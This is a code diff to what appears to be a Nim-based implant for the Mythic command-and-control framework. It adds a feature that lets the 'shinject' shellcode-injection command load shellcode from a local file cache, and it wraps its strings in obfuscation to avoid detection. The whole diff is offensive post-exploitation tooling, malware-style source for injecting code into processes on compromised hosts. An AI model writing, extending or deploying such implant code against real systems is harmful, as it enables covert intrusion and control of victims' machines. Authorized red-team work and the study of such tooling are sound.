@@ -1,5 +1,6 @@
 import json
 import ../utils/strenc
+import ../global_data
 
 when defined(windows):
   import base64
@@ -30,6 +31,20 @@ proc shinject*(taskId: string, params: JsonNode): JsonNode =
   else:
     try:
       let args = to(params, ShinjectArgs)
+      
+      # Check if using cached file
+      if params.hasKey(obf("cached")):
+        let cachedName = params[obf("cached")].getStr()
+        let cachedData = getCachedFile(cachedName)
+        if cachedData.len == 0:
+          return %*{
+            obf("task_id"): taskId,
+            obf("completed"): true,
+            obf("status"): "error",
+            obf("user_output"): obf("File not found in cache. Use register_file first: ") & cachedName
+          }
+        var fileData: seq[byte] = @[]
+        return processShinjectChunk(taskId, params, encode(cast[string](cachedData)), 1, 1, fileData)
       
       # Step 1: Request the shellcode file from Mythic
       return %*{
